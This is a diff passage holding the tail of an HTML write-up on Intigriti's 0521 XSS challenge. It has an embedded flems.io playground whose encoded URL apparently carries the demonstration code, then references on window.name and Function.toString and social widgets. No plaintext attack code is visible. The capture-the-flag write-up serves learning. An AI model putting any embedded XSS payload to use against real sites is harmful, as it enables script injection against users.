+<iframe height="600px" width="100%" src="https://flems.io/#0=N4IgtglgJlA2CmIBcAOAjAOhQZgDQgDMIEBnZAbVADsBDMRJEDACwBcxYR8BjAeytbwByEAB4AhAFpJAAgACAUQIF43VgCUhNKjOkA+ADpUjE6TIAOAJ14BzS-BIkZAVxLwoM-rACeM1rxkbIXhLGkE-ZngLGm9YXhoPfRMrW3tHGWgAXgMQeByZADcaWGd4bJAABnywGgAPcrQKqpAZElZYspyoCBJzWBikKn48kD1RAHoUuwcSQ2MqUQgCUPoMqHLluhGZWnpy4pDWAAooXm5negEMU5qIKgBKfIB3aFZmTMaKgFIZMfGllbwPRcEBuBBqCD8MiMCpIACcIAAvrhqFsRBgAFZkHj8QTCRh8KhtQLBULhTIyI58KDwXAyABGNDcdMJ3DC9xkmT0MmARhkMgQrGisXiHgpAHJxQBuIx8mQEXiWSkQDI6anwDm8nT8+WKykY1UyVnsnlynUZAiU9XkCAAXU5FONrHIGNtmrN5uFcQSMgA1BSAAYAEmAjLciPIFVt5BDGMRtt9AZl2s9DPsNAA1snU4iPbntfn+XL7KxnJYdOYYt6oBgSLAINx4EcKnTKyKEhgEFQbG9dDI0Pdk-mjITiWGohLyPAAFTwX1z+AYeC26UjqFCp2c-nwIqwI7j+6R23JtdEoX0kpKilBKghMJN8UXsviunjln8NmsQen4mj1iWZw1D1a9SXvI5xT-ACgMsF8GSZWkjQ-dlkz-Bk7jFElbzJB9IMA-wYNfeD3yoT9v3mVDxwUXcADkti3AMpxjUNL3jedbSTH8NyQ1gqOKWjVgpGQd2Kfd4N42B+I1I8TxI9cZAAfWE2B6JDG870EcClNgyiaK2YjP3EyT7kRDjZLPTxzCEAAFGh7AESI3CcQNVNAjTxXAwi3EMvTEJIsJvPoYzTNQ+TdgnGRg2ANTsPAsLtLE3T6H0-zEo1EyULk7g4jcGy7LeBwHBUqLXIfe54q81Lkp41KgpkkKlMkorFN3RFfRDXhLKoXKhHyxzWpDUKtn64Ast4HLbJ6hyHHS2UzOJNtq3otApXgJin0seMmNw6DNpDel0PjAM-RkcUA3GacQ3FY7mr4ujfROxFp3GAMXtXeZxnGGQFFqPpeAgVhZtQ1hbKCIUKRyNhWHMEgkA+7hmGKLsgkkCoAFYACZMDuVgIDsf6IAwSFxjZcxWHhmgMHMZhzByIxNnoWtLG4LdgcsUHjvFAB+bhMiu+6hHVABVdQAEkAGFeDAcxhgEI4FtFQcQT4KXiBCERGXpeBOHwMFVBxqEREaJBsCRW1ESAA"></iframe><br><br>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/name" target="_blank" rel="noopener noreferrer">Window.name - MDN Web Docs</a></li>
+<li><a href="https://blog.bitsrc.io/accessing-element-ids-in-dom-as-window-global-variables-5085ccc3b368" target="_blank" rel="noopener noreferrer">Accessing Element IDs in DOM as window/global Variables - Bits &#x26; Pieces</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/toString" target="_blank" rel="noopener noreferrer">Function.prototype.toString() - MDN Web Docs</a></li>
+<li><a href="https://twitter.com/intigriti/status/1399317852788830211" target="_blank" rel="noopener noreferrer">Intigriti’s 0521 XSS challenge - Intigriti</a></li>
+</ol>
+<hr>
+<h2 id="discuss-on-twitter">Discuss on Twitter</h2>
+<center>
+<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="EffectRenan" data-color="#ffffff" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00"></script>
+</center>
+<blockquote align="center" class="twitter-tweet"><p lang="en" dir="ltr">I'm late, but here it is.<br><br>Write-up to Intigriti's XSS challenge. Check it out!<a href="https://t.co/F8OMnc5bmc">https://t.co/F8OMnc5bmc</a><a href="https://twitter.com/hashtag/XSS?src=hash&#x26;ref_src=twsrc%5Etfw">#XSS</a> <a href="https://t.co/MvFbuONgWr">https://t.co/MvFbuONgWr</a></p>— Renan Rocha (@EffectRenan) <a href="https://twitter.com/EffectRenan/status/1402094865421320195?ref_src=twsrc%5Etfw">June 8, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 
+    </div>
+  </body></html>
